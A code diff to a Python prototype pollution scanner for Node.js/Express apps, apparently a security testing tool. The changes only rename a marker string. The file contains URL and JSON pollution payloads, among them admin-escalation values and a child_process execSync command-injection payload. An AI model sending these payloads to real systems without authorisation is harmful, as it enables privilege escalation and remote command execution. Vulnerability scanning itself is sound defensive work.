@@ -1,5 +1,5 @@
 """
-cyberm4fia-scanner - Prototype Pollution Scanner
+scanner - Prototype Pollution Scanner
 Detects JavaScript prototype pollution via URL parameters and JSON bodies.
 Targets Node.js/Express applications with merge/extend patterns.
 """
@@ -18,10 +18,10 @@ from utils.request import ScanExceptions
 # URL parameter-based payloads
 URL_PAYLOADS = [
     # __proto__ pollution
-    ("__proto__[polluted]", "cyberm4fia"),
-    ("__proto__.polluted", "cyberm4fia"),
-    ("constructor[prototype][polluted]", "cyberm4fia"),
-    ("constructor.prototype.polluted", "cyberm4fia"),
+    ("__proto__[polluted]", "scanner"),
+    ("__proto__.polluted", "scanner"),
+    ("constructor[prototype][polluted]", "scanner"),
+    ("constructor.prototype.polluted", "scanner"),
     # Specific exploitation payloads
     ("__proto__[isAdmin]", "true"),
     ("__proto__[role]", "admin"),
@@ -33,15 +33,15 @@ URL_PAYLOADS = [
         'x;process.mainModule.require("child_process").execSync("id");x',
     ),
     # Nested pollution
-    ("__proto__[toString]", "cyberm4fia"),
+    ("__proto__[toString]", "scanner"),
     ("__proto__[valueOf]", "1"),
-    ("__proto__[0]", "cyberm4fia"),
+    ("__proto__[0]", "scanner"),
 ]
 
 # JSON body-based payloads
 JSON_PAYLOADS = [
-    {"__proto__": {"polluted": "cyberm4fia"}},
-    {"constructor": {"prototype": {"polluted": "cyberm4fia"}}},
+    {"__proto__": {"polluted": "scanner"}},
+    {"constructor": {"prototype": {"polluted": "scanner"}}},
     {"__proto__": {"isAdmin": True}},
     {"__proto__": {"role": "admin"}},
     {"__proto__": {"status": 500}},
@@ -50,7 +50,7 @@ JSON_PAYLOADS = [
 
 # Detection signatures — things that indicate pollution worked
 POLLUTION_SIGNATURES = [
-    "cyberm4fia",
+    "scanner",
     '"polluted"',
     '"isAdmin":true',
     '"role":"admin"',
